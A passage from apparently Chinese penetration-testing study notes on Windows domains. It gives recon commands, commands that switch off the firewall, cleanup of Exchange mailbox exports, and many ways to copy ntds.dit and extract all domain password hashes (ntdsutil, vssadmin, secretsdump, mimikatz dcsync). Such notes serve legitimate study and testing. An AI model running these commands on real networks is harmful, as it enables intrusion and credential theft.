DMZ不能访问内网<br>如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。</p><p>(6）DMZ不能访问外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</p><p><strong>域中计算机分类</strong></p><p>域控制器-成员服务器-客户机-独立服务器</p><p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。<br>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</p><p><strong>内权限解读:</strong></p><p><strong>域本地组</strong>，多域用户访问单域资源（访问同一个域)。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限</p><p><strong>全局组</strong>，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p><p><strong>通用组</strong>，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628104718578.png" alt="image-20220628104718578"></p><p><strong>A-G-DL-P策略</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628154433781.png" alt="image-20220628154433781"></p><p><strong>本地域组的权限</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155157050.png" alt="image-20220628155157050"></p><p><strong>全局组、通用组的权限</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155303297.png" alt="image-20220628155303297"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p><strong>工作组信息搜集</strong></p><p><strong>本机信息收集</strong></p><p>查询网络配置</p><pre><code>ipconfig /all</code></pre><p>查询用户列表</p><pre><code>net usernet localgroup administratorsquery user ||qwinsta 查看当前在线用户</code></pre><p>查询进程列表</p><pre><code>tasklist /vwmic process list brief</code></pre><p>查询操作系统及安装软件版本信息</p><pre><code>获取操作系统和版本信息systeminfo查看安装软件以及版本路径wmic product name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></pre><p>查询端口列表</p><pre><code>netstat -ano</code></pre><p>查询补丁列表</p><pre><code>systeminfoWmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p>查询本机共享</p><pre><code>net sharewmic share get name,path,status</code></pre><p>查询防火墙配置</p><pre><code>查看防火墙配置:netsh firewall show config关闭防火墙:Windows server 2003系统及其以前：netsh firewall set opmode disableWindows server 2003以后系统版本：netsh advfirewall set allprofiles state off修改防火墙配置windows server 2003系统及之前版本，允许指定程序全部连接:netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enablewindows server 2003之后系统版本:允许指定程序接入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许3389端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </code></pre><p>查询并开启远程连接服务</p><pre><code>查询远程连接端口Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumberwindows server 2008和windows server 2012开启3389方法(win7只可以用前两条):wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwindows server 2003和windows xp:wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限的话需要administrator及以上</code></pre><p>查询当前权限</p><pre><code>whoami whoami /all #获取域SIDnet user XXX /domain 获取指定账户的详细信息</code></pre><p>判断是否有域</p><pre><code>ipconfig /allsysteminfonet config workstationnet time /domain1.存在域，当前不是域用户2.存在域，当前是域用户3.不存在域</code></pre><p><strong>域内存活主机探测</strong></p><p><strong>1.利用NetBIOS快速探测内网</strong></p><p>工具:Nbtscan</p><p>使用方法:nbtscan.exe IP</p><p><strong>2.利用icmp探测内网</strong></p><pre><code>for /L %l in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%l | findstr &quot;TTL=&quot;</code></pre><p><strong>3.利用arp扫描完整探测内网</strong></p><p>1.arp-scan</p><p>2.Invoke-ARPScan.ps1</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220630100231019.png" alt="image-20220630100231019"></p><p><strong>4.利用常规tcp/udp端口扫描探测内网</strong></p><p>工具:scanline</p><pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt  -p 192.168.4.1-254 /b</code></pre><p><strong>域内端口扫描</strong></p><p><strong>1.telnet探测</strong></p><pre><code>telnet ip 端口</code></pre><p><strong>2.S扫描器</strong></p><pre><code>S.exe TCP 192.168.1.1192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111256 /Banner /save</code></pre><p><strong>域内基础信息收集</strong></p><pre><code>net view /domainnet view /domain:XXXnet group /domainnet group &quot;domain computers&quot; /domainnet accounts /domainnltest /domain_trusts</code></pre><p><strong>域内控制器的查找</strong></p><pre><code>nltest /DCLIST:XXXNslookup -type=SRV _ldap._tcpnet time /domainnet group &quot;Domain Controllers&quot; /domainnetdom query pdc</code></pre><p><strong>域内用户和管理员</strong></p><pre><code>查询所有域用户列表net user /domainwmic useraccount get /alldsquery usernet localgroup administrators /domain查询域管理员用户组net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain</code></pre><p><strong>查找域管理进程</strong></p><p><strong>1.本机检查</strong></p><ul><li>获取域管理员列表 A,B,C</li><li>查看本机所有进程</li><li>交叉</li></ul><pre><code>1.获取域管理员列表net group &quot;Domain Admins&quot; /domain2.列出本机所有进程及进程用户tasklist /v3.寻找是否有进程所有者位域管理员的进程</code></pre><p><strong>2.查询域控制器的域用户会话</strong></p><pre><code>1.收集域控制器的列表net group &quot;Domain Controllers&quot; /domain2.收集域管理员的列表net group &quot;Domain Admins&quot; /domain3.使用Netsess.exe查询每个域控制器收集所有活动域会话的列表Netsess.exe -h4.将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌。</code></pre><p><strong>3.扫描远程系统上运行的任务</strong></p><pre><code>1.收集域管理员的列表net group &quot;Domain Admins&quot; /domain3.运行脚本FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><p><strong>4.扫描远程系统上的NetBIOS信息</strong></p><pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</code></pre><p><strong>PowerShell收集域信息</strong></p><p>PowerShell版本</p><ul><li>2.0 win2008,win7</li><li>3.0 win2012,win8</li><li>4.0 win2012R2,win8.1</li><li>5.0 win2016,win10</li></ul><p>PowerShell策略</p><pre><code>Restricted #不能执行任何脚本Allsigned #只允许执行正规签名的脚本Unrestricted #执行任意脚本RemoteSigned #本机执行脚本不受限制，执行远程脚本，必须经过签名</code></pre><p>修改策略</p><pre><code>Get-Executionpolicy  #查看当前策略Set-Executionpolicy Unrestricted # 修改策略</code></pre><p><strong>使用Powerview进行信息搜集</strong></p><pre><code>-exec bypassImport-Module.\PowerView.ps1</code></pre><p>常用命令:</p><pre><code>Import-Module为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1命令格式：powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot; 定位域管理员powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; Invoke-UserHunter&#125;&quot; 更多PowerView命令参数Get-NetDomain: 获取当前用户所在域的名称Get-NetUser: 获取所有用户的详细信息Get-NetDomainController: 获取所有域控制器的信息Get-NetComputer: 获取域内所有机器的详细信息Get-NetOU: 获取域中的OU信息Get-NetGroup: 获取所有域内组和组成员信息Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息Get-NetShare: 获取当前域内所有网络共享信息Get-NetSession: 获取指定服务器的会话Get-NetRDPSession: 获取指定服务器的远程连接Get-NetProcess: 获取远程主机的进程Get-UserEvent: 获取指定用户的日志Get-ADObiect: 获取活动目录的对象Get-NetGPO: 获取域内所有的组策略对象Get-DomainPolicy: 获取域默认策略或域控制器策略Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</code></pre><h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><p>网络层隧道:</p><ul><li><p>IPv6隧道</p></li><li><p>ICMP隧道 (ping ip)</p></li></ul><p>传输层隧道:</p><ul><li>TCP (nc ip port)</li><li>UDP</li></ul><p>应用层隧道:</p><ul><li>SSH</li><li>HTTP(curl ip:port)</li><li>DNS(nslookup <a href="http://www.baidu.com/">www.baidu.com</a> vps-ip)(dig @vps-ip <a href="http://www.baidu.com/">www.baidu.com</a>)</li></ul><p><strong>ICMP隧道</strong></p><p>ICMP隧道工具有：PingTunnel、icmptunnel、icmpsh、powershell、icmp等</p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>exchange邮件服务器</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220701171227982.png" alt="image-20220701171227982"></p><p>客户端/远程访问接口和协议</p><ul><li>OWA</li><li>ECP</li><li>EWS</li></ul><p>基于端口扫描发现:</p><ul><li>25端口 SMTP的指纹显示为Exchange smtpd</li><li>80端口为 iis 8.5</li><li>443端口</li></ul><p>SPN查询</p><ul><li><pre><code>setspn -T pentest.com -F -Q */*</code></pre></li></ul><p><strong>Exchange基本操作</strong></p><p>查看Mailbox数据库</p><ul><li><pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre></li><li><pre><code>add-pssnapin microsoft.exchange*</code></pre></li></ul><p>获取现有用户邮件地址</p><ul><li>查看全部用户邮箱使用信息</li></ul><pre><code>Get-Mailbox | Format-Tables Name,WindowsEmailAddress</code></pre><ul><li>查看指定用户邮箱使用信息</li></ul><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalltemSize,LastLogonTime</code></pre><ul><li>查看全部用户邮箱使用信息</li></ul><pre><code>Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalltemSize-Descend</code></pre><p><strong>添加权限</strong></p><ul><li><p>查看用户角色权限</p><pre><code>Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre></li><li><p>添加用户角色权限</p></li></ul><pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><ul><li>删除用户角色权限</li></ul><pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><p><strong>设置网络共享文件夹</strong></p><pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><p><strong>清理痕迹</strong></p><ul><li>查看之前产生的导出请求记录</li></ul><pre><code>Get-MailboxExportRequest</code></pre><ul><li>删除导出请求记录</li></ul><pre><code>Remove-MailboxExportRequest -Identity Administrator\mailboxexport</code></pre><h2 id="攻击域控制器"><a href="#攻击域控制器" class="headerlink" title="攻击域控制器"></a>攻击域控制器</h2><h3 id="导出ntds-dit工具使用"><a href="#导出ntds-dit工具使用" class="headerlink" title="导出ntds.dit工具使用"></a><strong>导出ntds.dit工具使用</strong></h3><h4 id="ntdsutil工具提取"><a href="#ntdsutil工具提取" class="headerlink" title="ntdsutil工具提取"></a>ntdsutil工具提取</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702110915019.png" alt="image-20220702110915019"></p><p>命令:</p><p>创建快照:</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>挂载快照:</p><pre><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></pre><p>拷贝快照:</p><pre><code>copy C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p>卸载并删除快照:</p><pre><code>ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></pre><p>查看快照</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></pre><h4 id="vssadmin工具导出"><a href="#vssadmin工具导出" class="headerlink" title="vssadmin工具导出"></a>vssadmin工具导出</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702112559750.png" alt="image-20220702112559750"></p><p>命令:</p><p>创建快照:</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>复制文件</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,dit</code></pre><p>删除快照</p><pre><code>vssadmin delete shadows /for=c : /quite</code></pre><h4 id="利用vssown-vbs提取"><a href="#利用vssown-vbs提取" class="headerlink" title="利用vssown.vbs提取"></a>利用vssown.vbs提取</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702113237136.png" alt="image-20220702113237136"></p><pre><code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></pre><pre><code>cscript vssown.vbs /start #启动卷影复制服务cscipt vssown.vbs/create c #创建一个c盘的卷影副本copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,ditescript vssown.vbs /list #列出当前卷影副本escript vssown.vbs /delete #删除卷影副本</code></pre><h4 id="NTDSUTIL的IFM"><a href="#NTDSUTIL的IFM" class="headerlink" title="NTDSUTIL的IFM"></a>NTDSUTIL的IFM</h4><pre><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot;q q</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114121276.png" alt="image-20220702114121276"></p><h4 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114210607.png" alt="image-20220702114210607"></p><h4 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702151613418.png" alt="image-20220702151613418"></p><p>DiskShadow可以用来执行命令</p><p>示例:</p><p>将命令写入文件:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153003868.png" alt="image-20220702153003868"></p><p>使用diskshadow执行</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153216260.png" alt="image-20220702153216260"></p><p>使用diskshadow导出ntds.dit</p><p>将下列命令写入到command.txt文件</p><pre><code>set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;cmd.exe&quot; /c copy k:\\windows\\ntds\\ntds.dit c:\\ntds.ditdelete shadows alllist shadows allresetexit</code></pre><p>然后执行</p><pre><code>diskshadow /s C:\\command.txt # 注意这里需要进入C:\Windows\System32目录下执行，否则会报错</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702154731904.png" alt="image-20220702154731904"></p><p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit 的密钥，所以没有该密钥，将无法查看ntds.dit中的信息</p><p>system.hive文件在</p><pre><code>C:\Windows\System32\config</code></pre><p>直接使用注册表命令将system.live文件导出到当前路径</p><pre><code>reg save hklm\system system.hive #同理sam也可以这样导出 reg save hklm\sam sam.hive</code></pre><h3 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a><strong>解析ntds.dit</strong></h3><h4 id="使用esedbexport和ntdsxtract恢复ntds-dit提取其散列值"><a href="#使用esedbexport和ntdsxtract恢复ntds-dit提取其散列值" class="headerlink" title="使用esedbexport和ntdsxtract恢复ntds.dit提取其散列值"></a>使用esedbexport和ntdsxtract恢复ntds.dit提取其散列值</h4><p>esedbexport安装:</p><p>在kali下载libesedb</p><pre><code class="shell">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz</code></pre><p>下载安装依赖环境</p><pre><code class="shell">apt-get install autoconf automake autopoint libtool pkg-config</code></pre><p>解压</p><pre><code class="shell">tar -xzvf libesedb-experimental-20210424.tar.gz</code></pre><p>配置</p><pre><code class="shell">cd libesedb-20210424./configure</code></pre><p>编译</p><pre><code class="shell">make</code></pre><p>安装</p><pre><code class="shell">sudo make install</code></pre><p>配置</p><pre><code class="shell">sudo ldconfig</code></pre><p>安装完成后会在<code>/usr/local/bin</code>目录下看到<code>esedbexport</code>程序</p><p>将<code>ntds.dit</code>文件上传到kali中，使用<code>esedbexport</code>进行恢复操作</p><pre><code class="shell">esedbexport -m table ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702170750923.png" alt="image-20220702170750923"></p><p>提取根据ntds.dit的散列值提取其内容的方法:</p><p>使用ntdsxtract</p><p>安装命令:</p><pre><code class="shell">git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtract/python setup.py build &amp;&amp; python setup.py install</code></pre><p>安装完成后，我们将上一步中导出的“ntds.dit.export”文件夹中的datatable.3、link_table.5这两个表和之前获得的“SYSTEM”文件一并放入ntdsxtract的文件夹中。然后我们就可以执行如下命令，将域内的所有用户及散列值导出到result.txt文件中</p><pre><code class="shell">dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;</code></pre><p>命令:</p><pre><code class="shell">python dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt# –pwdformat选项是选择以什么格式进行提取，有john(John format)、ocl(oclHashcat)、ophc(OphCrack)三个选项。</code></pre><p>最终获得文件</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162054315.png" alt="image-20220706162054315"></p><p>Ntdsxtract中还具有一个“dscomputers.py”工具可以从分离出来的表中提取域中计算机信息。这对于离线分析目标信息是非常有用的。</p><p>在使用过程中，需要对它提供datatable，输出目录以及输出文件，输出文件的格式为csv：</p><pre><code class="shell">python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile domain_computers_info.csv </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162710090.png" alt="image-20220706162710090"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162817060.png" alt="image-20220706162817060"></p><h4 id="使用Impacket中的secretsdump"><a href="#使用Impacket中的secretsdump" class="headerlink" title="使用Impacket中的secretsdump"></a>使用Impacket中的secretsdump</h4><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>secretsdump.py是Impacket工具包中的一个脚本，该脚本实现了多种不需要在远程主机上执行任何代理的情况下转储机密数据的技术。对于SAM和LSA Secrets（包括缓存的凭据），我们尽可能的尝试从注册表中读取，然后将hives保存在目标系统（％SYSTEMROOT％\Temp目录）中，并从那里读取其余的数据。</p><p>secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到Ntds.dit和SYSTEM这两个文件。</p><p>使用方法:</p><pre><code class="shell">git clone https://github.com/SecureAuthCorp/impacketcd impacketsudo python3 setup.py installcd ..cd examplepython3 secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706222324453.png" alt="image-20220706222324453"></p><h4 id="PowerShell下的利用"><a href="#PowerShell下的利用" class="headerlink" title="PowerShell下的利用"></a>PowerShell下的利用</h4><p>DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p><p>支持系统：</p><ul><li>Windows Server 2012 R2</li><li>Windows Server 2008 R2</li><li>Windows 10 64-bit</li><li>Windows 8.1 64-bit</li><li>Windows 7 64-bit</li></ul><p>安装与配置方法：</p><pre><code class="shell">PowerShell 5.0：Install-Module DSInternals或Install-Module -Name DSInternals -RequiredVersion 3.2.1PowerShell 3.0、4.0：解压压缩包 cd C:\DSInternalsImport-Module .\DSInternals</code></pre><p>使用DSInternals模块提取用户哈希值，我们需要先获取Ntds.dit、SYSTEM这两个文件。将Ntds.dit、SYSTEM这两个文件导出并拖到我们本地后，即可执行如下命令获取所有账户哈希：</p><pre><code class="shell">Import-Module DSInternals       // 导入DSInternals模块// 获取所有账户信息：$key = Get-Bootkey -SystemHivePath &#39;C:\目录\system.hive&#39;    Get-ADDBAccount -All -DBPath &#39;C:\目录\ntds.dit&#39; -Bootkey $key</code></pre><p>还可以导出支持Hashcat格式的哈希：</p><pre><code class="shell">$key = Get-Bootkey -SystemHivePath &#39;C:\目录\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\目录\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt</code></pre><h4 id="使用NTDSDumpex-exe可以导出散列值"><a href="#使用NTDSDumpex-exe可以导出散列值" class="headerlink" title="使用NTDSDumpex.exe可以导出散列值"></a>使用NTDSDumpex.exe可以导出散列值</h4><p>使用NTDSDumpex.exe可以进行导出散列值的操作。</p><p>将ntds.dit、NTDSDumpex.exe、system.hive 放在同一目录下，输入如下命令即可导出域账号和散列值。</p><p>NTDSDumpEx.exe下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx">https://github.com/zcgonvh/NTDSDumpEx</a></p><p>获取key：reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</p><p>使用NTDSDumpEx获取所有域用户的Hash</p><pre><code class="shell">NTDSDumpEx.exe -d ntds.dit -s system.hive -o hash.txt</code></pre><h4 id="在线利用dcsync获取提取Ntds-dit中的哈希"><a href="#在线利用dcsync获取提取Ntds-dit中的哈希" class="headerlink" title="在线利用dcsync获取提取Ntds.dit中的哈希"></a>在线利用dcsync获取提取Ntds.dit中的哈希</h4><p>DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。</p><p>Mimikatz下载地址：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>利用Mimikatz的dcsync功能获取提取Ntds.dit中的哈希的操作如下：</p><p>在域内任意一台主机上运行mimikatz并执行如下命令：</p><pre><code>lsadump::dcsync /domain:xxx.com /all /csvlsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706225104256.png" alt="image-20220706225104256"></p><p>或者</p><pre><code class="shell">privilege::debugloglsadump::lsa /inject</code></pre><h4 id="在线-PowerShell提取Ntds-dit中的哈希"><a href="#在线-PowerShell提取Ntds-dit中的哈希" class="headerlink" title="在线-PowerShell提取Ntds.dit中的哈希"></a>在线-PowerShell提取Ntds.dit中的哈希</h4><p>即Invoke-DCSync.ps1脚本。</p><p>下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p><p>在域内任何一台主机上面执行如下命令：</p><pre><code class="shell">Set-Executionpolicy bypassImport-Module .\Invoke-DCSync.ps 1Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hashInvoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // 导出域内administrator账户的hash</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102847191.png" alt="image-20220707102847191"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102954770.png" alt="image-20220707102954770"></p><h4 id="在线-使用metasploit获取域散列"><a href="#在线-使用metasploit获取域散列" class="headerlink" title="在线-使用metasploit获取域散列"></a>在线-使用metasploit获取域散列</h4><ul><li>Ntds.dit(也被称为Active Directory database)包含了当前域用户中所有的用户的账号信息和其hash值</li><li>默认路径: C:\Windows\NTDS</li><li>只能通过域控制器进程和协议访问</li></ul><p>可能用到的模块:</p><pre><code>post/windows/gather/ntds_location #该模块可查看路径ntdspost/windows/gather/smart_hashdump #在线导出域账户hash(建议2012以上使用)auxiliary/admin/smb/psexec_ntdsgrab #利用域管账户，导出ntds必要文件到本地post/windows/gather/ntds_grabber #利用powershell将ntds必要文件下载到本地后使用post/windows/gather/credentials/domain_hashdump #介绍其方法</code></pre><h4 id="在线-使用vshadow和QuarksPwDump导出域账号和域散列值"><a href="#在线-使用vshadow和QuarksPwDump导出域账号和域散列值" class="headerlink" title="在线-使用vshadow和QuarksPwDump导出域账号和域散列值"></a>在线-使用vshadow和QuarksPwDump导出域账号和域散列值</h4><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre><code class="shell">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive</code></pre><p>shadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>在这个项目中，作者已经给出了shadow.exe:</p><p><a 